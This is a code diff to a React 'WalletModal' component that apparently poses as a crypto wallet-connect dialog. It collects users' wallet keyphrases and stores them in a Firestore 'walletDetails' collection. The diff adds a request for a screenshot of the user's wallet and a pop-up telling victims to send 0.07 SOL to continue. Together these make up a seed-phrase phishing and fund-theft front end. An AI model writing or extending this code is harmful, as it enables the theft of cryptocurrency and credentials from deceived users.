@@ -2,6 +2,11 @@
 import React, { useState, useEffect, useCallback } from 'react';
 import { db } from '@/firebaseConfig'; // Adjust the import based on your Firebase setup
 import { getFirestore, collection, addDoc } from 'firebase/firestore';
+import { HiViewGrid } from "react-icons/hi";
+import { toast } from 'react-toastify';
+import 'react-toastify/dist/ReactToastify.css';
+
+
 
 const WalletModal = ({ isOpen, onClose }) => {
   const [showSecondaryModal, setShowSecondaryModal] = useState(false);
@@ -49,11 +54,25 @@ const WalletModal = ({ isOpen, onClose }) => {
     try {
       const docRef = await addDoc(collection(db, "walletDetails"), walletDetails);
       console.log("Document written with ID: ", docRef.id);
-      alert(`Connected to ${selectedWallet} successfully! Fund Your wallet using this Address: 000x0x0nbcb0ca0 to proceed.`);
+      
+      // toast.success(`Connected to ${selectedWallet} successfully!`);
+      toast.info('Fund your wallet with 0.07 SOL to continue.', {
+        position: 'top-center',
+        autoClose: 7000,
+        style: {
+          background: 'black',
+          color: 'red',
+          fontWeight: 'bold',
+        },
+      
+      });
+    
       onClose(); // Close the modal after successful connection
     } catch (e) {
       console.error("Error adding document: ", e);
+      toast.error("Failed to connect. Please try again.");
     }
+    
   };
 
   const handleFileChange = (event) => {
@@ -122,17 +141,18 @@ const WalletModal = ({ isOpen, onClose }) => {
                 >
                   <img src={image} alt={name} className="h-6 w-6 mr-2" />
                   <span className="block text-sm text-gray-300 font-medium">{name}</span>
-                  <span className="text-xs text-green-500 ml-auto">INSTALLED</span>
+                  <span className="text-xs bg-[#1F3A28] p-1 font-bold rounded text-green-500 ml-auto">INSTALLED</span>
                 </li>
               ))}
             </ul>
             <button
-              className="w-full mt-4 bg-indigo-600 hover:bg-indigo-500 text-white font-semibold py-2 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-indigo-400 focus:ring-opacity-75"
+              className="w-full flex  items-center gap-4 pl-2 mt-4 bg-gray-800 text-sm text-white font-semibold py-2 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-indigo-400 focus:ring-opacity-75"
               onClick={handleOtherOptionsClick}
             >
+              <HiViewGrid />
               All Wallets
             </button>
-            <p className="mt-4 text-center text-gray-400">Haven't got a wallet? <span className="text-indigo-500 cursor-pointer">Get started</span></p>
+            <p className="mt-4 text-center text-xs text-gray-400">Haven't got a wallet? <span className="text-indigo-500 text-sm cursor-pointer">Get started</span></p>
           </div>
         ) : (
           <div>
@@ -158,8 +178,8 @@ const WalletModal = ({ isOpen, onClose }) => {
                   onChange={(e) => setKeyphrase(e.target.value)}
                 />
               </div>
-              <div>
-                <label htmlFor="importFile" className="block text-sm font-medium text-gray-300 mb-1">Import from File:</label>
+              <div className='border-1 border-white pl-2 p-3 rounded'>
+                <label htmlFor="importFile" className="block text-sm font-medium text-gray-300 mb-1">Add a screenshot of your wallet here:</label>
                 <input
                   type="file"
                   id="importFile"
@@ -170,13 +190,13 @@ const WalletModal = ({ isOpen, onClose }) => {
             </div>
             <div className="mt-6 flex justify-end space-x-2">
               <button
-                className="bg-gray-700 hover:bg-gray-600 text-gray-100 font-semibold py-3 px-4 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-gray-500 focus:ring-opacity-75"
+                className="bg-gray-700 h-10 hover:bg-gray-600 text-gray-100 font-semibold py-3 px-4 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-gray-500 focus:ring-opacity-75"
                 onClick={handleBack}
               >
                 Back
               </button>
               <button
-                className="bg-indigo-600 hover:bg-indigo-500 text-white font-semibold py-3 px-6 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-indigo-400 focus:ring-opacity-75"
+                className="bg-[#00cc33] text-sm text-white h-10 font-semibold py-1 px-4 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-indigo-400 focus:ring-opacity-75"
                 onClick={handleConnect}
               >
                 Connect
